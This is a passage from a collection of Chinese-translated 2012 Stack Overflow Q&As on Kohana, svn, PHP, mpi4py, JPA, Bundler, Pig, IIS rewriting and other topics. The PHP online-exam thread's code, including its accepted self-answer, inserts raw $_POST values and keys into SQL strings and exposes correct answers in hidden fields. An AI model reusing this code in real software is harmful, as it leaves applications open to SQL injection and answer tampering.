            android:layout_height="wrap_content"
            android:background="@drawable/scan"
            android:text=""
            android:layout_below="@+id/image1" />
    </LinearLayout>
    <LinearLayout
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:id="@+id/mio_ad" 
        android:layout_alignParentBottom="true" >

    </LinearLayout>
</RelativeLayout> 
```

# session - Kohana 和 CKFINDER。会话问题

> ID：11427870
> 
> 赞同：0
> 
> 时间：2012-07-11T07:43:03.343
> 
> 标签：session, kohana, ckfinder

在 Ckfinder config.php 中有基于 SESSION 的 authchecking。在 kohana 主控制器中，我设置了会话变量。但是当我在 config.php 中检查它时，它总是空的。session_start() 在文件的开头。

什么问题？如何访问真正的 kohana 会话？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T12:15:04.207

解决方案很简单：用 kohana 设置 cookie，在 ckfinder 中检查。

我试过了，它正在工作。

# java - 使用卡片布局只需一个按钮即可更改窗格

> ID：11427871
> 
> 赞同：0
> 
> 时间：2012-07-11T07:43:04.633
> 
> 标签：java, swing, cardlayout

我有一个使用卡片布局作为布局管理器的 gui。这个 gui 有两个按钮 prev 和 next 来更改视图。我会知道是否可以使用只有一个按钮的 CardLayout 更改卡。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T12:34:39.913

*（改编自我的评论）*

这绝对是可能的。如果您想要与现有按钮之一相同的功能，只需删除另一个按钮即可！

# c# - LINQ to SQL System.Data.Linq.DataContext 未引用

> ID：11427873
> 
> 赞同：1
> 
> 时间：2012-07-11T07:43:06.327
> 
> 标签：c#, asp.net, linq-to-sql

我在 c# 中有以下代码。

```
 using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Data;
    using System.Web;
    using System.Web.UI;
    using System.Web.UI.WebControls;
    using V2.PaidTimeOffDAL;

    public partial class _Default : System.Web.UI.Page 
    {
    protected void Page_Load(object sender, EventArgs e)
    {

    }
    protected void btnView_Click(object sender, EventArgs e)
    {

        HRPaidTimeOffDataContext db = new HRPaidTimeOffDataContext();
        var userAccounts =
        from u in db.BMS_Users
        select u;
        GridView1.DataSource = userAccounts;
        GridView1.DataBind();

    }
    } 
```

每当我测试时，我都会收到以下错误“System.Data.Linq.DataContent 是在未引用的程序集中定义的。您必须添加对程序集的引用'System.Data.Linq Version=3.5.0.0' Culture=Neutral PublicKeyToken=############”。

每当我尝试使用 System.Data.Linq 添加指令时，我都会收到以下错误“命名空间‘System.Data’中不存在类型或命名空间名称‘Ling’”

我是 LINQ to SQL 的新手。请协助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T07:48:09.820

您还需要添加对 System.Data.Linq 程序集的引用。单独编写 using 语句是不够的。

# svn - svn 更新慢（在 1Mb 存储库上 15 分钟以上）

> ID：11427875
> 
> 赞同：2
> 
> 时间：2012-07-11T07:43:09.450
> 
> 标签：svn

在我们的实时服务器上运行`svn update`有时需要超过 15 分钟才能完成。

1.  我们的存储库非常小，大约 1Mb 约 100 个文件（这是一个小网站）
2.  我们有几个开发人员同时进行提交/更新，这工作得很好
3.  我们更新了服务器上的所有更改（仅更新`svn update`），而且运行速度非常缓慢
4.  我们从来没有`svn commit`从服务器上做过（它应该是我们网站的只读版本）

随着时间的推移，它在服务器上的执行似乎变得越来越慢`svn update`，即使它只是一个需要更新的文件。我开始认为我们服务器上存储库的“年龄”与它有多慢有关？如果是这样，我们可以做些什么来加快速度？

更新#1

我仍然认为“年龄”与`svn update`缓慢有关，但可能必须考虑当服务器上的存储库“年龄”时实际发生的情况......

我认为这是以下原因：

1.  自 2010 年 1 月以来，我们已经检查了 WebsiteA 上的存储库（使用`svn checkout`）并定期更新（使用）`svn update`
2.  我们还以相同的方式在 WebsiteZ 上检查了相同的存储库，但这发生在几天前，即 2012 年 7 月
3.  WebsiteA 和 WebsiteZ 都在同一个物理服务器上，并且都使用同一个存储库
4.  在 WebsiteA 上运行`svn update`以从修订版 100 更新到 101 需要 20 多分钟
5.  在 WebsiteZ 上运行`svn update`以从修订版 100 更新到 101 只需几秒钟

我能看到的这些网站之间的唯一区别是 WebsiteA 存在的时间更长一些。WebsiteA 中可能有一些额外的文件（缓存内容），尽管这非常少（少于 20 个文件），并且包含缓存文件的目录已使用 svn:ignore 设置为忽略所有文件。

我想我不能排除网络问题，但我假设 WebsiteA 和 WebsiteZ 将运行相同的防火墙设置，如果有规则，它将是“阻止”而不是“延迟”。由于两个网站都在同一台服务器上，我认为它们都应该在相同的时间内更新网络问题。

更新#2

值得注意的是，如果我们这样做`svn update file.txt`，它会运行得非常快。就好像 svn 正在比较我们在目录中的所有内容，只是为了找出要更新的内容。

更新#3

我们最终升级了 svn 并升级了所有签出的版本。`svn update`现在似乎跑得更快了，手指交叉保持这种状态。谢谢大家帮忙！！

更新#4

当然，重新结帐可以解决问题，但只能持续几天/几周。我想今天终于找到了svn慢的原因。我们使用 Zend_Auth 并在每个页面上调用 Zend_Auth::hasIdentity() 来检查用户是否登录。这个调用创建了一个会话，而会话又在服务器上创建了一个会话文件。如果浏览器（或 googlebot）在关闭 cookie 的情况下浏览，我们会为每个请求创建一个会话文件。因此我们的会话目录有数百万个文件。我们删除了目录中的文件，并修复了通过在调用 hasIdentity() 之前检查 cookie 是否已设置来确定用户是否登录的方式。`svn`现在更新运行时间 <30 秒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-13T09:57:04.667

我建议使用`svnadmin dump`and来重建 subversion 存储库（在备份它之后！） `svnadmin load`，例如，如[手册](http://svnbook.red-bean.com/en/1.7/svn.reposadmin.maint.html#svn.reposadmin.maint.migrate)中所述。可能是通过旧版本升级时存储库中存在一些异常。你说这是一个旧的存储库，所以这里可能就是这种情况。执行转储 -> 加载循环意味着 Subversion 可能会以当前格式创建更优化的存储库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T16:09:21.480

SVN 将源文件和等量的元数据（.svn 目录）写入本地磁盘。如果网络不是问题，您还可以检查磁盘性能如何。我遇到过 SAN 磁盘很慢的情况（网络延迟、本地和远程数据之间的错误检查等）并且导致 SVN 延迟。通常在这种情况下，本地磁盘应该工作得更好。您可以尝试以下方法：

*   如果可能，请`svn export`在与存储库和 svn 守护程序运行的同一台服务器上进行操作。如果它在那里运行得更快，那么它是网络或磁盘。
*   如果`svn export`在其他客户端/开发机器上运行得更快，那么它应该是磁盘。

我怀疑存储库的年龄是否与性能有关。

希望这可以帮助。

# php - php 表单提交查询。和回答。用于在线考试

> ID：11427877
> 
> 赞同：0
> 
> 时间：2012-07-11T07:43:22.177
> 
> 标签：php, arrays, forms

插入查询的艰难时期。

我的表单有 1 个问题，4 个选项，在 while 循环中带有单选按钮。问题和选项是从名为 paper 的表中获取的，我使用数组作为问题和答案。下面是我使用的代码。

```
<form id="form1" action="submit_answer.php" method="post">
<?php
$get_question = mysql_query("select * from paper where test_name='$test_name' ORDER BY RAND()");
$count = 0;
$sr = 1;
if(mysql_num_rows($get_question)==0)
{
    echo "No Questions Found For ".$test_name;
}
else
{
    while($row_question = mysql_fetch_array($get_question))
    {
        $id = $row_question["id"];
        $question = $row_question["question"];
        $option1 = $row_question["option1"];
        $option2 = $row_question["option2"];
        $option3 = $row_question["option3"];
        $option4 = $row_question["option4"];
        $answer = $row_question["answer"];

        echo '<div class="question_box">
                <p>'.$sr.'. '.$question.'</p>
                <div style="margin:10px 0 0 10px;">

                    <input type="text" value="'.$std.'" name="std" />
                    <input type="text" value="'.$student_name.'" name="student_name" />
                    <input type="text" value="'.$test_name.'" name="test_name" />
                    <input type="text" value="'.$question.'" name="question[]" />
                    <input type="hidden" value="'.$answer.'" name="true_answer[]" />
                    <input type="radio" class="answers" name="given_answer['.$count.']" value="A" />&nbsp;'.$option1.'<br/>
                    <input type="radio" class="answers" name="given_answer['.$count.']" value="B" />&nbsp;'.$option2.'<br/>
                    <input type="radio" class="answers" name="given_answer['.$count.']" value="C" />&nbsp;'.$option3.'<br/>
                    <input type="radio" class="answers" name="given_answer['.$count.']" value="D" />&nbsp;'.$option4.'<br/>
                    <input checked="checked" type="radio" class="answers" name="given_answer['.$count.']" value="NONE" style="display:none;" />
                </div>
        </div>';
        $count++;
        $sr++;
    }
}
?>
    <button class="stdbtn btn_black" style="opacity: 1;" type="button" onclick="submit_exam();">Submit</button>
</form> 
```

现在，submit_answer.php 页面用于提交所有问题和答案，包括学生标准、学生姓名、测试名称、问题和答案。下面是我使用的代码：

```
foreach($_POST as $key => $value)
{
    echo $key;
    echo "<br />";
    print_r($value);
    echo "<br />";
    echo "<br />";

    mysql_query("insert into student_answer($key) values($value)");

    echo mysql_error();
} 
```

它确实插入了学生的标准，但没有插入其余的值，并给了我错误。

```
**Unknown column 'Array' in 'field list'** 
```

表字段是：

```
+------++--------------++-----------++----------++--------------+
| std  || student_name || test_name || question || given_answer |
+------++--------------++-----------++----------++--------------+ 
```

请在上述查询中帮助我。提前致谢！！:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-12T05:15:03.307

大声笑我得到了自己的答案，查询将如下所示：

```
$count = $_POST["count"];    // hidden value under the while loop

for($i=1; $i<=$count; $i++)
{
   $test_name = $_POST["test_name"];
   $std = $_POST["std"];
   $student_name = $_POST["student_name"];
   $question = $_POST["question"][$i-1];
   $given_answer = $_POST["given_answer"][$i-1];

   mysql_query("insert into student_answer(std,student_name,test_name,question,given_answer) values('$std','$student_name','$test_name','$question','$given_answer')");

    echo mysql_error();

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T08:00:28.417

您已用作`$given_answer`数组参数，因此它返回`array`in `$key`。尝试使用隐藏参数计数，然后插入`$key[$count]`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-05T06:23:31.433

我更喜欢你在市场上购买可用的在线脚本作为它的起点。这将节省您的时间、成本和测试工作。

下面是我使用它的优秀脚本之一，它就像魅力一样。以此为基础，我使用计算机自适应测试开发了一个拥有 1000 多个用户的在线测试门户。

[http://codecanyon.net/item/online-skills-assessment/9379895](http://codecanyon.net/item/online-skills-assessment/9379895)

对于希望开发在线考试系统的人们来说，这是一个很好的起点

# python - 使用 NumPy 在 MPI4Py 中发送和接收结构化数组数据

> ID：11427878
> 
> 赞同：5
> 
> 时间：2012-07-11T07:43:23.393
> 
> 标签：python, numpy, mpi, mpi4py

我正在尝试使用 NumPy 中的结构化数组在 MPI4Py 中发送和接收数据。以下是我的数组结构：

```
numpy.zeros(FILE_LINES, dtype='i4,54b') 
```

我正在使用 Sendrecv 方法来交换数据，如下所示：

```
comm.Sendrecv(data_send, dest=partner_rank, sendtag=data_tag, \
        recvbuf=data_receive, source=partner_rank, recvtag=data_tag, status=None) 
```

但是当调用通信方法时出现异常：

```
Traceback (most recent call last):
  File "bipy.py", line 91, in <module>
  bitonic_sort()
File "bipy.py", line 72, in bitonic_sort
  bitonic_merge(i, ixj, (i & k) == 0)
File "bipy.py", line 51, in bitonic_merge
  recvbuf=data_receive, source=partner_rank, recvtag=data_tag, status=None)
File "Comm.pyx", line 166, in mpi4py.MPI.Comm.Sendrecv (src/mpi4py.MPI.c:58898)
File "message.pxi", line 318, in mpi4py.MPI.message_p2p_send (src/mpi4py.MPI.c:21422)
File "message.pxi", line 301, in mpi4py.MPI._p_msg_p2p.for_send (src/mpi4py.MPI.c:21285)
File "message.pxi", line 111, in mpi4py.MPI.message_simple (src/mpi4py.MPI.c:19256)
File "message.pxi", line 58, in mpi4py.MPI.message_basic (src/mpi4py.MPI.c:18509)
KeyError: 'T{=l:f0:(54)b:f1:}' 
```

它在使用只有一种数据类型（例如，所有字节）的数组时有效。MPI4Py 无法发送这些结构化数组，还是我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-12T09:31:14.113

正如 Jonathan Dursi 在他的评论中已经提到的：首字母大写（例如`Sendrecv()`）的通信例程只能通信“内存缓冲区”，即提供特定 C API 的数据结构。结构化数组似乎不是这样的数据结构。要发送它，请使用`sendrecv()`.

[请参阅http://mpi4py.scipy.org/docs/usrman/mpi4py.html](http://mpi4py.scipy.org/docs/usrman/mpi4py.html)的 MPI4Py 文档。

# mysql - 通过命令行查询 mysql 将列值显示为？

> ID：11427879
> 
> 赞同：0
> 
> 时间：2012-07-11T07:43:25.610
> 
> 标签：mysql, command-line, utf-8, latin

我`table` `Collation`的`Latin`只是……而且我可以毫无问题地以任何语言存储`columns`文本`utf8 unicode`

然而，当我去`console`查看一些东西时，我看到的`non-latin`文字是，`?????`但在网站上它们看起来很好......

```
| 30 | 8196371 | 5842337911 | ???????????? | ?????? ??? ??? ??????????? 
```

这是一个问题还是它只是控制台的工作原理？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:14:21.463

我认为您应该使用以下选项启动控制台：“–default-character-set=utf8”

# hibernate - jpa协会儿童实体

> ID：11427883
> 
> 赞同：0
> 
> 时间：2012-07-11T07:43:41.877
> 
> 标签：hibernate, jpa, jpa-2.0

我有一个实体 Person，它是另外两个实体的父级：Caller 和 Employee。这些实体是使用带有鉴别器列的 SINGE_TABLE 策略实现的：person_id。
我还有另一个实体：与 Person 具有多对多关系的位置。因此，一个人可能属于多个位置，一个位置可以有多个人。
用 manyToMany 映射 Location 和 Person 很容易，但现在我需要一种映射子实体的方法，因为在 location 中我需要一些方法，例如：getEmployees(); 和 getCallers();
我试过类似的东西：

```
public class Location implements Serializable, Comparable<Location> {

    private static final long serialVersionUID = 1L;

    @ManyToMany(mappedBy="locations")
    private List<Caller> callers = new ArrayList<Caller>();

    @ManyToMany(mappedBy="locations")
    private List<Employee> employees = new ArrayList<Employee>();
}

@Entity
@DiscriminatorValue("0")
@Access(AccessType.FIELD)   

public class Caller extends Person {
private static final long serialVersionUID = 1L;

@Column(name = "company_name")
private String companyName;

@Column(name = "individual")
private Boolean individual;
}

@Entity
@Access(AccessType.FIELD)
@DiscriminatorValue("1")
public class Employee extends Person {
    private static final long serialVersionUID = 7526471155622776147L;

}

@Entity
@Access(AccessType.FIELD)
@Inheritance(strategy=InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name="person_type",discriminatorType=DiscriminatorType.INTEGER)
@Table(name="persons")
public class Person implements Serializable, Comparable<Person>{

    private static final long serialVersionUID = 7526471155622776147L;

    @ManyToMany
    @JoinTable(name="persons_locations",
               joinColumns={@JoinColumn(name="person_id")},
               inverseJoinColumns={@JoinColumn(name="location_id")})
    private List<Location> locations;
} 
```

但是当我尝试编译应用程序时出现此错误：

```
Caused by: org.hibernate.AnnotationException: mappedBy reference an unknown target entity property: xxx.entities.yyy.Caller.locations in xxx.vs.entities.yyy.Location.callers. 
```

我想一种解决方案是将位置向下移动到子级中，但是我必须复制/粘贴一些代码，毕竟位置是普通人的财产。

处理此类问题的正确方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T09:49:58.620

你尝试过的都行不通。如果您在 Caller 和 Location 之间有关联，则必须在 Caller 中定义该关联，而不是在 Person 中。员工也一样。而且我*认为*您还需要两个不同的连接表。

# ruby-on-rails - Bundler：咦，这个gem版本是从哪里突然冒出来的？

> ID：11427885
> 
> 赞同：0
> 
> 时间：2012-07-11T07:43:44.360
> 
> 标签：ruby-on-rails, gem, bundle

我被告知要使用 rails-i18n gem 的 v0.6.5，所以我首先检查我是否已经是最新的，而我不是（v0.6.0）。所以我尝试`gem update rails-i18n`了（这似乎不是更新特定 gem 的正确命令，但它似乎更新了所有已安装的 gem，对吗？），这似乎没有更新任何东西（“没有更新”）。

所以我`gem 'rails-i18n', '>= 0.6.5'`在我的 Gemfile 中指定，然后运行`bundle`​​. 这似乎也没有安装任何新的东西（没有花费近一秒钟的时间来完成，并且控制台输出中只有“Using ...”语句），但经过另一次检查，v0.6.5 已安装！

我现在有点困惑，这个版本是从哪里来的？它是否已经安装在我的系统上？那为什么我第一次检查 using 时它没有出现`gem list | grep i18n`？

查看我的输出以验证我的陈述。

```
macbuech:iq josh$ gem list | grep i18n
i18n (0.6.0)
rails-i18n (0.6.5)
macbuech:iq josh$ gem update rails-i18n
Updating installed gems
Nothing to update
macbuech:iq josh$ bundle
Using rake (0.9.2.2) 
Using i18n (0.6.0) 
Using multi_json (1.3.6) 
Using activesupport (3.2.1) 
Using builder (3.0.0) 
Using activemodel (3.2.1) 
Using erubis (2.7.0) 
Using journey (1.0.4) 
Using rack (1.4.1) 
Using rack-cache (1.2) 
Using rack-test (0.6.1) 
Using hike (1.2.1) 
Using tilt (1.3.3) 
Using sprockets (2.1.3) 
Using actionpack (3.2.1) 
Using mime-types (1.19) 
Using polyglot (0.3.3) 
Using treetop (1.4.10) 
Using mail (2.4.4) 
Using actionmailer (3.2.1) 
Using arel (3.0.2) 
Using tzinfo (0.3.33) 
Using activerecord (3.2.1) 
Using activeresource (3.2.1) 
Using addressable (2.2.8) 
Using ancestry (1.3.0) 
Using bcrypt-ruby (3.0.1) 
Using bson (1.5.2) 
Using bson_ext (1.5.2) 
Using bundler (1.1.4) 
Using highline (1.6.12) 
Using net-ssh (2.5.2) 
Using net-scp (1.0.4) 
Using net-sftp (2.0.5) 
Using net-ssh-gateway (1.1.0) 
Using capistrano (2.12.0) 
Using nokogiri (1.5.5) 
Using ffi (1.0.11) 
Using childprocess (0.3.2) 
Using libwebsocket (0.1.3) 
Using rubyzip (0.9.9) 
Using selenium-webdriver (2.24.0) 
Using xpath (0.1.4) 
Using capybara (1.1.2) 
Using capybara-firebug (1.1.0) 
Using json (1.7.3) 
Using capybara-webkit (0.12.1) 
Using carrierwave (0.6.2) 
Using mongo (1.5.2) 
Using mongoid (2.4.11) 
Using carrierwave-mongoid (0.2.1) 
Using chronic (0.6.7) 
Using chunky_png (1.2.5) 
Using cleditor_rails (0.0.3) 
Using coderay (1.0.7) 
Using coffee-script-source (1.3.3) 
Using execjs (1.4.0) 
Using coffee-script (2.2.0) 
Using rack-ssl (1.3.2) 
Using rdoc (3.12) 
Using thor (0.14.6) 
Using railties (3.2.1) 
Using coffee-rails (3.2.2) 
Using columnize (0.3.6) 
Using fssm (0.2.9) 
Using sass (3.1.19) 
Using compass (0.12.2) 
Using compass-rails (1.0.2) 
Using coolline (0.2.0) 
Using diff-lcs (1.1.3) 
Using gherkin (2.11.1) 
Using cucumber (1.2.1) 
Using cucumber-rails (1.3.0) 
Using daemons (1.1.8) 
Using database_cleaner (0.8.0) 
Using debugger-ruby_core_source (1.1.3) 
Using debugger-linecache (1.1.2) 
Using debugger (1.1.4) 
Using delayed_job (3.0.3) 
Using delayed_job_active_record (0.3.2) 
Using orm_adapter (0.3.0) 
Using warden (1.2.1) 
Using devise (2.1.2) 
Using eventmachine (0.12.10) 
Using em-websocket (0.3.6) 
Using rspec-core (2.10.1) 
Using rspec-expectations (2.10.0) 
Using rspec-mocks (2.10.1) 
Using rspec (2.10.0) 
Using email_spec (1.2.1) 
Using factory_girl (3.5.0) 
Using factory_girl_rails (3.5.0) 
Using formtastic (2.2.1) 
Using god (0.12.1) 
Using rb-fchange (0.0.5) 
Using rb-fsevent (0.9.1) 
Using rb-inotify (0.8.8) 
Using listen (0.4.7) 
Using guard (1.1.1) 
Using guard-bundler (1.0.0) 
Using guard-cucumber (1.2.0) 
Using guard-livereload (1.0.0) 
Using guard-migrate (0.1.1) 
Using guard-rails (0.1.0) 
Using guard-rspec (1.1.0) 
Using spork (0.9.2) 
Using guard-spork (1.1.0) 
Using haml (3.1.6) 
Using haml-rails (0.3.4) 
Using hpricot (0.8.6) 
Using jquery-rails (2.0.2) 
Using jquery-ui-rails (1.0.0) 
Using kaminari (0.13.0) 
Using launchy (2.1.0) 
Using linecache19 (0.5.13) from source at ~/.rvm/gems/ruby-1.9.3-p0/gems/linecache19-0.5.13/ 
Using method_source (0.7.1) 
Using mysql2 (0.3.11) 
Using prickle (0.0.6) 
Using slop (2.4.4) 
Using pry (0.9.9.6) 
Using pry-debugger (0.2.0) 
Using yard (0.8.2.1) 
Using pry-doc (0.4.2) 
Using pry-rails (0.1.6) 
Using rack-livereload (0.3.6) 
Using rails (3.2.1) 
Using rails-i18n (0.6.5) 
Using rails3-jquery-autocomplete (1.0.7) 
Using remarkable (4.0.0.alpha4) 
Using remarkable_activemodel (4.0.0.alpha4) 
Using remarkable_activerecord (4.0.0.alpha4) 
Using rspec-rails (2.10.1) 
Using ruby-debug-base19 (0.11.26) from source at ~/.rvm/gems/ruby-1.9.3-p0/gems/ruby-debug-base19-0.11.26/ 
Using ruby-debug19 (0.11.6) 
Using ruby_gntp (0.3.4) 
Using sexp_processor (3.2.0) 
Using ruby_parser (2.3.1) 
Using sass-rails (3.2.5) 
Using shoulda-matchers (1.2.0) 
Using simplecov-html (0.5.3) 
Using simplecov (0.6.4) 
Using syntax (1.0.0) 
Using uglifier (1.2.5) 
Using vpim (0.695) 
Using whenever (0.7.3) 
Using yajl-ruby (1.1.0) 
Your bundle is complete! Use `bundle show [gemname]` to see where a bundled gem is installed.
macbuech:iq josh$ gem list | grep i18n
i18n (0.6.0)
rails-i18n (0.6.5)
macbuech:iq josh$ 
```

非常感谢您的澄清。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-11T07:46:53.157

你已经*是*最新的了。

```
macbuech:iq josh$ gem list | grep i18n
i18n (0.6.0)
rails-i18n (0.6.5) 
```

您已经`0.6.5`有`rails-i18n`. 这是您拥有的另一个`i18n`宝石版本`0.6.0`（并且仍然如此）

# javascript - 根据选择值更改表单输入的数量

> ID：11427887
> 
> 赞同：1
> 
> 时间：2012-07-11T07:43:49.950
> 
> 标签：javascript

我有一个格式如下的表格：http: [//jsfiddle.net/E3DfA/](http://jsfiddle.net/E3DfA/)

What I am trying to achive is so that when the value of the select changes, the number of form inputs changes.

我四处搜索，但没有发现对我真正有意义的东西，我知道我需要使用 ajax，但我该怎么做。朝着正确的方向推动将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:48:58.757

您不需要使用 AJAX。您需要捕获元素`input`上的事件`select`，然后生成要显示的 HTML 代码。

看看[jQuery](http://jquery.com/)库，文档包含可能的示例。

### 编辑

你快到了

```
$("select").change(function () {
      var str = "";
      var count = Number($("select option:selected").val())
      for (var i = 0; i < count; i++) {
          str += '<div class="oneinput"> <label>' + i
                  + "</label> <input name='" + i + "'></input>"
                  + "</div>";
      }

      $("#text").html(str);
}); 
```

您`.each`在需要使用`for`-loop 的地方使用了。`each`遍历数组。​</p>

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T08:02:11.820

你在找这个吗？

它的非常基本的例子：

[基本示例](http://jsfiddle.net/JwYTp/ "基本示例")

# tokenize - 如何在 Pig 中将字段转换为行？

> ID：11427889
> 
> 赞同：4
> 
> 时间：2012-07-11T07:43:54.477
> 
> 标签：tokenize, apache-pig

我想将字段转换为 Pig 中的行。

来自 input.txt

1 2 3 4 5 6 7 8 9

字段之间的分隔符是 '\t'。

输出.txt

1 2 3 4 ...但我不能使用 TOKENIZER 因为字段的内容可能是一个句子。请帮我。非常感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-28T01:45:03.723

I think alexeipab's answer is the right direction. Here is a simple example:

```
> A = load 'input.txt';
> dump A
(0,1,2,3,4,5,6,7,8,9)
> B = foreach A generate FLATTEN(TOBAG(*));
> dump B
(0)
(1)
(2)
(3)
(4)
(5)
(6)
(7)
(8)
(9) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-13T13:31:46.380

我在使用 Pig 时遇到了非常相似的问题。我最终做的是编写一个 UDF，它会简单地遍历元组。对于元组中的每个字段，它将使用字段值创建一个新元组并将其添加到数据包中。这是一个示例...

```
public DataBag exec(Tuple tuple) throws IOException {
    DataBag db = BagFactory.getInstance().newDefaultBag();
    for(int i = 0; i < tuple.size(); ++i){
        DefaultTuple dt = new DefaultTuple();
        dt.append(tuple.get(i));
        db.add(dt);
    }
    return db;
} 
```

显然，这不包括任何错误检查，因为它是一个示例，但它会帮助您了解如何执行此操作。

在您的脚本中，您可以“展平”结果并在需要时将单个值放回单个元组中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-15T09:13:31.600

使用 DataFu UDF TransposeTupleToBag ( [http://datafu.incubator.apache.org/docs/datafu/1.1.0/datafu/pig/util/TransposeTupleToBag.html](http://datafu.incubator.apache.org/docs/datafu/1.1.0/datafu/pig/util/TransposeTupleToBag.html) ) 获取一个包含 tuple 转置字段的包。展平包以获取具有 (key:chararray, value:chararray) 元组的行。从展平输出中选择“值”部分。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T17:21:17.287

看起来您想要旋转该行。有几个解决方案见[Pivot table with Apache Pig](https://stackoverflow.com/questions/11213567/pivot-table-with-apache-pig)或[Splitting a tuple into multiple tuples in Pig](https://stackoverflow.com/questions/11287362/splitting-a-tuple-into-multiple-tuples-in-pig)

# javascript - 在 ipod 上的 safari 浏览器中运行 asp.net 应用程序

> ID：11427891
> 
> 赞同：1
> 
> 时间：2012-07-11T07:43:55.637
> 
> 标签：javascript, asp.net, .net, safari, ipod

我正在 ipod 上的 safari 浏览器中测试我的 asp.net 应用程序。我在打开弹出窗口时遇到了一些问题。我有一个 gridview，其中有一些链接按钮。点击这些链接按钮时，弹出窗口应该打开。但是什么都没有发生。这个问题的任何解决方案？

```
function OpenQuestionWindow(Store, AuditDate, SectionId) {
        var returnValue = window.showModalDialog("Questions.aspx?store=" + Store + "&auditDate=" + AuditDate + "&section=" + SectionId, "", "dialogHeight:750px; dialogWidth:950px;center:yes;edge:raised; Scroll:Yes; ");

        if (returnValue == true) {
            __doPostBack('', '');
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T13:34:56.107

`window.showmodaldialog`不是 Apple Safari 支持的功能。请参阅[iPhone OS 的 Safari Web 内容指南](http://developer.apple.com/library/ios/DOCUMENTATION/AppleApplications/Reference/SafariWebContent/SafariWebContent.pdf)。在最好的情况下，移动浏览器会将该调用视为弹出窗口，默认情况下通常会被阻止。您应该查看一个 javascript UI 框架，想到 JQuery UI，以找到一种跨平台兼容的方式来做您想做的事情。

# android - ImageSwitcher 轻扫/滑动以获取下一张图片？

> ID：11427892
> 
> 赞同：1
> 
> 时间：2012-07-11T07:43:57.043
> 
> 标签：android

是否可以滑动到 ImageSwitcher 的下一张图片，而不是选择图库中的图片？如果是这样，有人可以指点我一个教程吗？

# iis-7 - iis7 共享网站的重写规则

> ID：11427896
> 
> 赞同：0
> 
> 时间：2012-07-11T07:44:09.120
> 
> 标签：iis-7, url-rewriting

我有一个问题让我很伤心。

我在同一台服务器上设置了 2 个网站（只有 1 个 IP 可用），它们具有根域和 www。＆*。定义为将流量发送到相同的 IP 地址。

让他们打电话

```
http://siteA.com   DNS settup with siteA.com  www.siteA.com  *.siteA.com
http://siteB.com   DNS settup with siteB.com  www.siteB.com  *.siteB.com 
```

siteA 需要是默认网站，它具有这样的绑定，即。*:80

```
*:80
siteA.com:80
www.siteA.com:80 
```

siteB网站上的绑定存在于：

```
siteB.com:80
www.siteB.com:80 
```

我需要的是 *.siteB.com 的任何内容都转到 siteB.com 而不是进入默认网站。目前 mce.siteB.com 将回退到 siteA.com

我尝试了很多组合，但无法解决这个问题。

我是否也将 URL 重写放在网站级别或 IIS 根级别？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T23:12:06.187

我最终解决了这个问题，纯粹是因为对 URL Rewrite 过程缺乏了解。

最终变得非常简单

并在siteA.com的传入规则中添加了以下内容，这只是在条件字段中调整模式的情况。我将传入的网址作为网址，而不仅仅是**{QUERY_STRING}**。

```
<rewrite>
  <rules>
    <rule name="Redirect to siteB.com patternSyntax="ECMAScript" stopProcessing="true">
      <match url=".*" />
      <conditions>
        <add input="{HTTP_HOST}" pattern="^.*siteB\.com" />
      </conditions>
      <action type="Redirect" url="http://siteB.com/{R:1}" />
    </rule>
  </rules>
</rewrite> 
```

# c# - 如何正确使用 Properties.Settings？

> ID：11427899
> 
> 赞同：0
> 
> 时间：2012-07-11T07:44:29.963
> 
> 标签：c#, winforms, propertygrid, system.componentmodel, properties.settings

我正在使用 Visual Studio 2010，其中有一个名为 Utilities 的项目，其中包含我`settings.settings`想从解决方案中的其他项目访问的文件。

在另一个项目中，我想让用户使用`PropertyGrid`. 我还想使用`System.ComponentModel`设置对其进行自定义。我试图应用`ComponentModel`设置，例如`DescriptionAttribute`在`Settings.Designer.cs`有效的文件中，但正如文件注释中所说，重新生成时对该文件的更改。

所以我的问题如下：

1.  如何`Properties.Settings`从另一个项目访问？
2.  如何在`PropertyGrid`不更改`Settings.Designer.cs`文件的情况下自定义？
3.  如前所述，我让用户从表单管理设置。但是，我想在用户按下取消按钮时恢复这些值。我怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:56:24.707

1.  将设置设计器中的访问修饰符设置为公共（默认为内部）

2.  我会为你的设置使用一个包装类（只是很多属性装饰的属性，get/set 指向原始设置）。此代码可以从 Settings.Designer.cs 文件自动生成。

3.  将先前的设置（例如通过序列化（二进制或 xml））保存到变量中。然后您可以通过将属性设置为保存的值来恢复它。

# nopcommerce - 如何在 nopcommerce 后端管理 xml 内容？

> ID：11427901
> 
> 赞同：1
> 
> 时间：2012-07-11T07:44:36.627
> 
> 标签：nopcommerce

我有一个关于在后端管理 xml 文件的问题。

在首页，有一个flash，这个flash请求一个xml文件（会包含一些图片url或者视频文件url），客户端想在后台管理这个xml文件。

我想知道这可能吗？如果是这样，怎么做？请告诉我详细信息或一些链接。

我尝试使用“主题”来做到这一点，但它只有一个富文本框编辑器，对于普通用户来说输入xml内容太难了。

任何帮助表示赞赏。

我使用 NopCommerce 1.9

* * *

## 回答 #1

> 赞同：0
> 
